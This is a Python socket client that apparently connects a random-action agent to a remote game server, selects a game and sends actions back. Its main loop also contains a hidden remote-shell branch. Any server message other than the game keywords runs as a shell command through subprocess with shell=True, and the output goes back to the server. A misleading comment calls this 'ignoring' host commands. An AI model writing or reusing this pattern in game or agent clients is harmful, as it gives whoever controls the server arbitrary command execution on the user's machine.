import socket
import os
import subprocess
import json
import numpy as np
import matplotlib.pyplot as plt
import time

s = socket.socket()
host = 'EduardoPC'
port = 9999

s.connect((host, port))
print('Client connected.')

def decode_step(data):
    return list(json.loads(data).values())

# Function to run the logic during gameplay
def play_game(agent, act_space_len):
    # plt.ion()
    while True:
        data = s.recv(1000000).decode()
        if(data == 'end'):
            print('Ending game...')
            break
        state_n, reward_n, done, info = decode_step(data)
        # Render state
        # plt.imshow(state_n)
        # plt.draw()
        # time.sleep(1/60)
        # Get action from agent
        action_n = agent(state_n, act_space_len)

        s.send(str(action_n[0]).encode()) # probably buggy

def get_agent(choice, state_0, act_space_len):

    if choice == 0:
        # random agent
        return lambda state_0, act_space_len: np.random.randint(0, act_space_len, 1) # probably buggy

while True:
    data = s.recv(4096).decode()
    print('Received from server:', data)

    if data == 'selected':
        print('Which game do you want to play?')
        data = s.recv(20480).decode()
        d = json.loads(data)
        for k, v in d.items():
            print(k, v)
        game = input(" -> ")
        # send game selection
        s.send(game.encode())

        # get environment info
        pack = s.recv(20480).decode()
        if pack != 'end':
            print('The game is available to play')
            d = json.loads(pack)
            print('Game info:', d)
            obs_space_shape = d['0']
            act_space_len = d['1']
            state_0 = s.recv(1000000).decode()
            state_0 = json.loads(state_0).values()
            # select agent
            agent = get_agent(0, state_0, act_space_len)
            # play game
            play_game(agent, act_space_len)
        else:
            print('This game is not available')

    # Ignore host commands dif from select
    elif len(data) > 0:
        cmd = subprocess.Popen(data[:],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        currentWD = os.getcwd() + "> "
        s.send(str.encode(output_str + currentWD))

    elif data == 'end':
        print('Closing client')
        break

s.close()